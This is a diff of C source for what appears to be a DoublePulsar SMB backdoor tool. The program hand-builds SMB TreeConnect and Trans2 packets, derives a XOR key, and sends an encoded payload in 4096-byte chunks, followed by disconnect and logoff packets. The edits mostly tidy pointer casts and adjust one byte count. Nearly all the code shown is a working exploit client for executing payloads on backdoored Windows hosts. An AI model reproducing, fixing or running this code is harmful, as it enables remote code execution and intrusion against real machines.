@@ -445,7 +445,7 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
@@ -455,8 +455,8 @@ int main(int argc, char* argv[])
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
 	//Update treeID, UserID
-	memcpy(trans2_request + 28, (char*)&treeid, 2);
-	memcpy(trans2_request + 32, (char*)&userid, 2);
+	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
+	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
 	//might need to update processid
 
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
@@ -593,7 +593,7 @@ int main(int argc, char* argv[])
 
 	//unsigned int XorKey = 0x58581162;
 	unsigned char byte_xor_key[5];
-	byte_xor_key[0] = (unsigned char)XorKey & 0xFF;
+	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
@@ -618,7 +618,7 @@ int main(int argc, char* argv[])
 
 	unsigned short TotalDataCount = 4096;
 	unsigned short DataCount = 4096;
-	unsigned short byteCount = 4096 + 13;
+	unsigned short byteCount = 4096 + 12;
 
 	//unsigned char SMBDATA[4096];
 	//memset(SMBDATA, 0x00, 4096);
@@ -666,13 +666,13 @@ int main(int argc, char* argv[])
 			*(WORD*)(last_packet + 0x3b) = DataCount;
 			*(WORD*)(last_packet + 0x43) = byteCount;
 
-			memcpy((unsigned char*)last_packet + 0x27, (char*)&TotalDataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x3b, (char*)&DataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x43, (char*)&byteCount, 2);
+			memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
 
 			//Update treeID, UserID
-			memcpy((unsigned char*)last_packet + 28, (char*)&treeid, 2);
-			memcpy((unsigned char*)last_packet + 32, (char*)&userid, 2);
+			memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
+			memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
 
 			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
@@ -723,8 +723,8 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
 
 		//Update treeID, UserID
-		memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
-		memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+		memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
+		memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);
 
 		//send the payload
 		send(sock, (char*)big_packet, size_normal_packet, 0);
@@ -765,8 +765,8 @@ int main(int argc, char* argv[])
 		"\x00\x08\x41\x00\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
@@ -778,8 +778,8 @@ int main(int argc, char* argv[])
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
